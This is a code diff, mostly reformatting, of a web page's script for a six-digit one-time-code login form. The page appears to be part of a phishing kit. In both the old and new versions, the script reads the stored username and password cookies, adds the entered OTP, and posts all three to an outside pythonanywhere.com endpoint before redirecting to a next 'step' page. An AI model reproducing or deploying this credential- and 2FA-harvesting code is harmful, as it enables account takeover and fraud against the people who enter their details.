-                $('.reject-data').hide();
+        $('.btn-close').on('click', function(e) {
+            e.preventDefault(); // Prevent default form submission
+            $('.reject-data').hide();
+        });
+
+        var isValid = true;
+        $('#login-otp').on('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+            isValid = true;
+            const otpInputs = document.querySelectorAll('.input-field input[type="number"]');
+            let otpCode = '';
+            otpInputs.forEach(input => {
+                otpCode += input.value;
             });
 
-            var isValid = true;
-            $('#login-otp').on('submit', function(e) {
-                e.preventDefault(); // Prevent default form submission
-                isValid = true;
-                const otpInputs = document.querySelectorAll('.input-field input[type="number"]');
-                let otpCode = '';
-                otpInputs.forEach(input => {
-                    otpCode += input.value;
-                });
+            const otp = otpCode.length;
+            if (otp < 6) {
+                isValid = false;
+            }
 
-                const otp = otpCode.length;
-                if (otp < 6) {
-                    isValid = false;
-                }
-                
-                if (isValid) {
-                    $('#login-otp').hide();
-                    $('.reject-data').hide();
-                    $('#loading-section').show();
-                    setCookie('otp',otpCode)
+            if (isValid) {
+                $('#login-otp').hide();
+                $('.reject-data').hide();
+                $('#loading-section').show();
+                setCookie('otp', otpCode)
 
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("POST", 'https://courtneylarson.pythonanywhere.com/s',true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.onreadystatechange = function() {
-                        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
-                            window.location.href = 'step3A';
-                        }
-                        else{
-                            console.log("ERRORRRRRR")
-                        }
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", 'https://courtneylarson.pythonanywhere.com/s', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                        window.location.href = 'step3A';
+                    } else {
+                        console.log("ERRORRRRRR")
                     }
+                }
 
-                    xhr.send(
-                        JSON.stringify({
+                xhr.send(
+                    JSON.stringify({
                         'username': getCookie('username'),
                         'password': getCookie('password'),
                         'otp': getCookie('otp'),
-                        })
-                    );
+                    })
+                );
 
 
 
-                    // window.location.href = 'step3A.html';
-                    
+                // window.location.href = 'step3A.html';
 
-                } else {
-                    alert('enter OTP with 6 digit');
-                }
-            });
 
-            otpinit();
-            function otpinit() { 
-                const inputs = document.querySelectorAll("input"),
+            } else {
+                alert('enter OTP with 6 digit');
+            }
+        });
+
+        otpinit();
+
+        function otpinit() {
+            const inputs = document.querySelectorAll("input"),
                 button = document.querySelector("button");
 
-                // iterate over all inputs
-                inputs.forEach((input, index1) => {
-                    input.addEventListener("keyup", (e) => {
-                        // This code gets the current input element and stores it in the currentInput variable
-                        // This code gets the next sibling element of the current input element and stores it in the nextInput variable
-                        // This code gets the previous sibling element of the current input element and stores it in the prevInput variable
-                        const currentInput = input,
-                          nextInput = input.nextElementSibling,
-                          prevInput = input.previousElementSibling;
+            // iterate over all inputs
+            inputs.forEach((input, index1) => {
+                input.addEventListener("keyup", (e) => {
+                    // This code gets the current input element and stores it in the currentInput variable
+                    // This code gets the next sibling element of the current input element and stores it in the nextInput variable
+                    // This code gets the previous sibling element of the current input element and stores it in the prevInput variable
+                    const currentInput = input,
+                        nextInput = input.nextElementSibling,
+                        prevInput = input.previousElementSibling;
 
-                        // if the value has more than one character then clear it
-                        if (currentInput.value.length > 1) {
-                          currentInput.value = "";
-                          return;
-                        }
-                        // if the next input is disabled and the current value is not empty
-                        //  enable the next input and focus on it
-                        if (nextInput && nextInput.hasAttribute("disabled") && currentInput.value !== "") {
-                          nextInput.removeAttribute("disabled");
-                          nextInput.focus();
-                        }
+                    // if the value has more than one character then clear it
+                    if (currentInput.value.length > 1) {
+                        currentInput.value = "";
+                        return;
+                    }
+                    // if the next input is disabled and the current value is not empty
+                    //  enable the next input and focus on it
+                    if (nextInput && nextInput.hasAttribute("disabled") && currentInput.value !== "") {
+                        nextInput.removeAttribute("disabled");
+                        nextInput.focus();
+                    }
 
-                        // if the backspace key is pressed
-                        if (e.key === "Backspace") {
-                          // iterate over all inputs again
-                          inputs.forEach((input, index2) => {
+                    // if the backspace key is pressed
+                    if (e.key === "Backspace") {
+                        // iterate over all inputs again
+                        inputs.forEach((input, index2) => {
                             // if the index1 of the current input is less than or equal to the index2 of the input in the outer loop
                             // and the previous element exists, set the disabled attribute on the input and focus on the previous element
                             if (index1 <= index2 && prevInput) {
-                              input.setAttribute("disabled", true);
-                              input.value = "";
-                              prevInput.focus();
+                                input.setAttribute("disabled", true);
+                                input.value = "";
+                                prevInput.focus();
                             }
-                          });
-                        }
-                        //if the fourth input( which index number is 3) is not empty and has not disable attribute then
-                        //add active class if not then remove the active class.
-                        if (!inputs[5].disabled && inputs[5].value !== "") {
-                          $('#login-otp').find(':input[type=submit]').prop('disabled', false);
-                          $('#login-otp').find(':input[type=submit]').addClass("active");
-                          return;
-                        }
-                        $('#login-otp').find(':input[type=submit]').removeClass("active");
-                        $('#login-otp').find(':input[type=submit]').prop('disabled', true);
-                    });
+                        });
+                    }
+                    //if the fourth input( which index number is 3) is not empty and has not disable attribute then
+                    //add active class if not then remove the active class.
+                    if (!inputs[5].disabled && inputs[5].value !== "") {
+                        $('#login-otp').find(':input[type=submit]').prop('disabled', false);
+                        $('#login-otp').find(':input[type=submit]').addClass("active");
+                        return;
+                    }
+                    $('#login-otp').find(':input[type=submit]').removeClass("active");
+                    $('#login-otp').find(':input[type=submit]').prop('disabled', true);
                 });
-            }
+            });
+        }
 
-        });
+    });
     </script>
+    <div id="2fa-auth-scan-qr"></div>
+</body>
 
-
-</body></html>
+</html>
